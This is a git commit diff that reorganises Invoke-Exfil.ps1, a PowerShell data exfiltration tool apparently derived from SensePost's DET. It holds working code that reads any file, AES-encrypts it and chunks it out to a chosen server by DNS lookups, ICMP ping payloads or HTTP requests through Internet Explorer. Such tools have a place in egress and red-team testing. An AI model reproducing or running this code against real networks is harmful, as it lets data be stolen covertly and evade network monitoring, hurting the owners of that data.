245aa900652b28fa7351431375d67d070e036a82
nerbix <nick.r.britton@gmail.com>
2017-03-08 15:43:29 -0600

    cleaning up .ps1

--- Invoke-Exfil.ps1
+++ Invoke-Exfil.ps1
@@ -1,50 +1,28 @@
-function Send-HTTPRequest {
-    param ([string] $data, [System.__ComObject] $IE)
-    $url = "http://" + $server + ":" + $port + "/";
-    $data = Base64 $data;
-    $IE.navigate2($url+$data)
-    Start-Sleep -s 2;
-};
-
-function Send-ICMPPacket {
-    param ([string] $data)
-    $data = Base64 $data;
-    $IPAddress = $server 
-    print $server 
-    $ICMPClient = New-Object System.Net.NetworkInformation.Ping
-    $PingOptions = New-Object System.Net.NetworkInformation.PingOptions
-    $PingOptions.DontFragment = $True
-    $sendbytes = ([text.encoding]::ASCII).GetBytes($data)
-    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
-    Start-Sleep -s 1;
-};
-
-function Send-DNSRequest {
-    param ([string] $server, [string] $data, [string] $jobid)
-    $data = Convert-ToCHexString $data  
-    $len = $data.Length;
-    $split = 66 - $len.Length - $dns.Length;
-    # get the size of the file and split it
-    $repeat=[Math]::Floor($len/($split));
-    $remainder=$len%$split;
-    if($remainder){ 
-        $repeat = $repeat + 1
-    };
-    
-    for($i=0; $i-lt$repeat; $i++){
-        $str = $data.Substring($i*$Split,$Split);
-        $str = $jobid + $str + '.' + $dns;
-        $q = nslookup -querytype=A $str $server;
-    };
-    if($remainder){
-        $str = $data.Substring($len-$remainder);
-        $str = $jobid + $str + '.' + $dns;
-        $q = nslookup -querytype=A $str $server;
-    };
-};
+function Invoke-Exfiltration {
 
 
-function Invoke-Exfil {
+<#
+  .SYNOPSIS
+  Exfiltrates data over speified protocols.
+  .DESCRIPTION
+  PowerShell and Python data exfiltration tool.  Based heavily on the work done by SensePost (http://github.com/sensepost/det).
+  .PARAMETER file
+  Full path of file to exfiltration
+  .PARAMETER key
+  AES encryption key
+  .PARAMETER port
+  Port for HTTP exfiltraton 
+  .PARAMETER type
+  Exfiltration method to use (dns, icmp, http)
+  .PARAMETER dns
+  DNS server to use for mock-dns exfiltration
+  .EXAMPLE
+  Invoke-EgressCheck -type icmp -server 127.0.0.1 -key HELLOWORLD -file c:\users\normaluser\desktop\file.txt
+  .LINK
+  https://github.com/nerbix/invoke-exfiltration
+  #>
+
+
     param ([string] $file, [string] $key, [string] $server, [string] $port, [string] $type, [string] $dns)
     $bytes = [System.IO.File]::ReadAllBytes($file)
     $md5 = New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
@@ -69,11 +47,7 @@ function Invoke-Exfil {
     $repeat=[Math]::Ceiling($len/$split);
     $remainder=$len%$split;
     $jobid = [System.Guid]::NewGuid().toString().Substring(0, 7)
-    $data = $jobid + '|!|' + $filename + '|!|REGISTER|!|' + $hash 
-
-
-    # determine exfil type and send data;
-	
+    $data = $jobid + '|!|' + $filename + '|!|REGISTER|!|' + $hash
 
 
     If ($type -eq 'DNS') {
@@ -90,11 +64,11 @@ function Invoke-Exfil {
             $data = $jobid + '|!|' + $i + '|!|' + $str
             $q = Send-DNSRequest $server $data $jobid
         };
-    
+
         $i = $i + 1
         $data = $jobid + '|!|' + $i + '|!|DONE'
         $q = Send-DNSRequest $server $data $jobid
-       }	
+       }
 
 
     ElseIf ($type -eq 'HTTP') {
@@ -115,7 +89,7 @@ function Invoke-Exfil {
         $data = $jobid + '|!|' + $i + '|!|DONE'
         $q = Send-HTTPRequest $data $IE
         }
-    
+
     Elseif ($type -eq 'ICMP') {
         $q = Send-ICMPPacket $data
         for($i=0; $i-lt($repeat-1); $i++){
@@ -129,42 +103,88 @@ function Invoke-Exfil {
             $data = $jobid + '|!|' + $i + '|!|' + $str
             $q = Send-ICMPPacket $data
         };
-    
+
         $i = $i + 1
         $data = $jobid + '|!|' + $i + '|!|DONE'
         $q = Send-ICMPPacket $data
         };
-       } 
-
-  
-function Base64 {
-    param ([string] $data)
-    $Bytes = [System.Text.Encoding]::ASCII.GetBytes($data)
-    return [Convert]::ToBase64String($Bytes)    
 }
 
-function AES {
-    param ([byte[]] $data)
-    $sha256 = New-Object System.Security.Cryptography.SHA256Managed
-    $AES = New-Object System.Security.Cryptography.AesManaged
-    $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
-    $AES.BlockSize = 128
-    $AES.KeySize = 256
-	$AES.Padding = "PKCS7"
-    $AES.Key = [Byte[]] $sha256.ComputeHash([Text.Encoding]::ASCII.GetBytes($key))
-    $IV = new-object "System.Byte[]" 16
-    $RNGCrypto = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
-    $RNGCrypto.GetBytes($IV)
-    $AES.IV = $IV
 
-    $Encryptor = $AES.CreateEncryptor()
+    function Send-HTTPRequest {
+        param ([string] $data, [System.__ComObject] $IE)
+        $url = "http://" + $server + ":" + $port + "/";
+        $data = Base64 $data;
+        $IE.navigate2($url+$data)
+        Start-Sleep -s 2;
+    };
 
-    return ($IV + $encryptor.TransformFinalBlock($data, 0, $data.Length))
-};
 
-function Convert-ToCHexString {
-    param ([String] $str) 
-    $ans = ''
-    [System.Text.Encoding]::ASCII.GetBytes($str) | % { $ans += "{0:X2}" -f $_ }
-    return $ans;
+    function Send-ICMPPacket {
+        param ([string] $data)
+        $data = Base64 $data;
+        $IPAddress = $server
+        print $server
+        $ICMPClient = New-Object System.Net.NetworkInformation.Ping
+        $PingOptions = New-Object System.Net.NetworkInformation.PingOptions
+        $PingOptions.DontFragment = $True
+        $sendbytes = ([text.encoding]::ASCII).GetBytes($data)
+        $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
+        Start-Sleep -s 1;
+    };
+
+
+    function Send-DNSRequest {
+        param ([string] $server, [string] $data, [string] $jobid)
+        $data = Convert-ToCHexString $data
+        $len = $data.Length;
+        $split = 66 - $len.Length - $dns.Length;
+        # get the size of the file and split it
+        $repeat=[Math]::Floor($len/($split));
+        $remainder=$len%$split;
+        if($remainder){
+            $repeat = $repeat + 1
+        };
+
+        for($i=0; $i-lt$repeat; $i++){
+            $str = $data.Substring($i*$Split,$Split);
+            $str = $jobid + $str + '.' + $dns;
+            $q = nslookup -querytype=A $str $server;
+        };
+        if($remainder){
+            $str = $data.Substring($len-$remainder);
+            $str = $jobid + $str + '.' + $dns;
+            $q = nslookup -querytype=A $str $server;
+        };
+    };
+
+
+    function Base64 {
+        param ([string] $data)
+        $Bytes = [System.Text.Encoding]::ASCII.GetBytes($data)
+        return [Convert]::ToBase64String($Bytes)
+    }
+
+    function AES {
+        param ([byte[]] $data)
+        $sha256 = New-Object System.Security.Cryptography.SHA256Managed
+        $AES = New-Object System.Security.Cryptography.AesManaged
+        $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
+        $AES.BlockSize = 128
+        $AES.KeySize = 256
+    	$AES.Padding = "PKCS7"
+        $AES.Key = [Byte[]] $sha256.ComputeHash([Text.Encoding]::ASCII.GetBytes($key))
+        $IV = new-object "System.Byte[]" 16
+        $RNGCrypto = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
+        $RNGCrypto.GetBytes($IV)
+        $AES.IV = $IV
+        $Encryptor = $AES.CreateEncryptor()
+        return ($IV + $encryptor.TransformFinalBlock($data, 0, $data.Length))
+    };
+
+    function Convert-ToCHexString {
+        param ([String] $str)
+        $ans = ''
+        [System.Text.Encoding]::ASCII.GetBytes($str) | % { $ans += "{0:X2}" -f $_ }
+        return $ans;
 }
